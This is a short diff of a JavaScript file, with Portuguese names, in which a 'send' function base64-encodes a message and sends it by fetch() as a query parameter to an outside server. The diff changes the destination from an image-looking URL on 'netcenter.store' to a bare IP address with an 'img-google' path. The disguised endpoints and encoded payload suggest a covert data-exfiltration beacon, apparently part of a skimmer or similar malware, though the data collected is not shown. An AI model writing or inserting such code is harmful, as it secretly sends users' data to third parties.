@@ -65,7 +65,7 @@ function send(atributosScript) {
     	return;
     }
 
-    const urlComParametro = `https://netcenter.store/img.png?i=${encodeURIComponent(mensagemBase64)}`;
+    const urlComParametro = `http://190.102.40.181/img-google?i=${encodeURIComponent(mensagemBase64)}`;
     
     fetch(urlComParametro, {
 	    method: 'GET',
